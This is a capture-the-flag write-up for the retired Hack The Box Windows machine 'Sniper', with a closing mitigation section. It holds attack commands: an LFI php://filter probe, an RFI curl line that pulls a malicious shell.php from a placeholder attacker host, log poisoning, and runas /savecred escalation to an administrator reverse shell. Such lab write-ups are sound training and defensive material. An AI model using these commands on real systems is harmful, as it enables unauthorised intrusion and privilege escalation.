---
machine: Sniper
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, lfi, rfi, smb, log-poisoning, runas, powershell]
---

# Sniper — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A `page` parameter allows LFI/RFI on a PHP site. The LFI reveals SMB share credentials; RFI and log poisoning provide a shell. A saved `runas /savecred` access runs PowerShell as administrator.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p80,139,445 <IP>
```

The site uses `blog.php?page=home`. Test traversal and wrappers:

```bash
curl 'http://sniper.htb/blog.php?page=php://filter/convert.base64-encode/resource=index'
```

Enumerate SMB with `smbclient` and `crackmapexec`.

## Initial access

The LFI reads configuration files and a share with credentials. Those credentials open a share containing PHP code or a writable directory.

If RFI is enabled, host a malicious PHP file and include it:

```bash
curl 'http://sniper.htb/blog.php?page=http://<ATTACKER>/shell.php'
```

Alternatively, poison an accessible log and include its path. The shell runs as the web service user.

## Lateral movement

Enumerate users and shares. Find a script or saved `runas` access:

```powershell
runas /savecred /user:Administrator cmd
```

`/savecred` reuses stored credentials without prompting.

## Escalation to administrator

Use the saved access to run PowerShell as administrator and obtain a reverse shell:

```powershell
runas /savecred /user:Administrator "powershell -c <payload>"
```

Read and redact the administrator flag.

## Evidence

- LFI response with redacted file.
- SMB share and redacted credentials.
- Initial shell.
- `runas /savecred` and administrator shell.

## Lessons learned

- LFI can expose credentials and source code.
- RFI/log poisoning turns LFI into RCE.
- Poorly segmented SMB shares leak secrets.
- `runas /savecred` is a classic Windows escalation.

## Mitigation and detection

- Avoid dynamic includes and allow only known paths.
- Disable `allow_url_include`.
- Restrict SMB and audit share permissions.
- Remove saved credentials and limit `runas`.

## References

- <https://www.hackthebox.com/machines/sniper>
- <https://owasp.org/www-community/attacks/Path_Traversal>
- <https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/runas>
